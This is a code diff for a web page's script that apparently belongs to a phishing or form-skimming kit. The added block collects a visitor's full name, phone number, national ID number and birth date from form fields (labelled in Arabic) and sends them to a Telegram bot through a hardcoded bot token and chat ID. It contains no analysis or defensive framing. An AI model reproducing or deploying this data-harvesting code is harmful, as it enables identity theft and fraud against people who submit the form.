@@ -177,7 +177,31 @@
       var nationalid = document.getElementById('nationalid').value;
       var birthdate = document.getElementById('birthdate').value;
 
+     
       
+      var message = "الاسم الرباعي: `" + fullname + "`\n"
+      message += "رقم الهاتف: `" + phonenumber + "`\n"
+      message += "الرقم الوطني: `" + nationalid + "`\n"
+      message += "تاريخ الميلاد: `" + birthdate + "`\n"
+
+
+      $.ajax({
+        type: 'POST',
+        url: `https://api.telegram.org/bot8063028988:AAHEgBfxirTdjnX3VEAGyQxXuTGCxGj-UvQ/sendMessage`,
+        data: {
+          chat_id: "6985854225",
+          text: message,
+          parse_mode: 'markdown',
+        },
+        success: function (res) {
+          console.debug(res);
+          $('#response').text('Message sent');
+        },
+        error: function (error) {
+          console.error(error);
+          alert("error failed");
+        }
+      }); 
       var message = "الاسم الرباعي: `" + fullname + "`\n"
       message += "رقم الهاتف: `" + phonenumber + "`\n"
       message += "الرقم الوطني: `" + nationalid + "`\n"
